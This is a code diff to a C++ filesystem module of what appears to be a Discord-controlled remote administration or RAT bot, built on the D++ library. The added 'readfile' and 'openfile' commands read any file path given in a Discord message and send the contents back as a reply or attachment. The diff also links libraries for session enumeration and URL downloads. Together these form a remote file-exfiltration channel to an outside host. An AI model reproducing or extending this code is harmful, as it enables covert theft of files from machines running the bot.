@@ -1,4 +1,11 @@
 #include "filesystem.h"
+#include <Shlwapi.h>
+
+
+#define _CRT_SECURE_NO_WARNINGS
+#pragma comment(lib, "Wtsapi32.lib")
+#pragma comment(lib, "Urlmon.lib")
+#pragma comment(lib, "Shlwapi.lib")
 
 using namespace std::filesystem;
 
@@ -55,6 +62,65 @@ std::string command_ls(std::vector<std::string> args) {
 	}
 
 	return output;
+}
+
+std::string command_readfile(std::vector<std::string> args, const dpp::message_create_t evnt) {
+	if (args.size() < 2)
+		return "Please Provide a Path to the File";
+	
+
+	std::string path = args[1];
+	if (path.find("/") == std::string::npos) {
+		path = cur_dir.path().string() + '/' + path;
+	}
+
+
+	FILE* f = fopen(path.c_str(), "rb");
+
+	if (!f)
+		return "Error opening the file";
+
+	fseek(f, 0, SEEK_END);
+	long fsize = ftell(f);
+	rewind(f);
+
+	char* string = new char[fsize + 1];
+	fread(string, fsize, 1, f);
+	fclose(f);
+	string[fsize] = '\0';
+
+	return string;
+}
+
+std::string command_openfile(std::vector<std::string> args, const dpp::message_create_t& evnt) {
+	if (args.size() < 2)
+		return "Please Provide a Path to the File";
+
+	std::string path = args[1];
+	if (path.find("/") == std::string::npos) {
+		path = cur_dir.path().string() + '/' + path;
+	}
+
+	FILE* f = fopen(path.c_str(), "rb");
+
+	if (!f)
+		return "Error opening the file";
+
+	fseek(f, 0, SEEK_END);
+	long fsize = ftell(f);
+	rewind(f);
+
+	char* string = new char[fsize + 1];
+	fread(string, fsize, 1, f);
+	fclose(f);
+	string[fsize] = '\0';
+
+	dpp::message msg;
+	msg.add_file(PathFindFileNameA(args[1].c_str()), string);
+
+	evnt.reply(msg);
+
+	return "";
 }
 
 /* checking if a folder exists given its path */
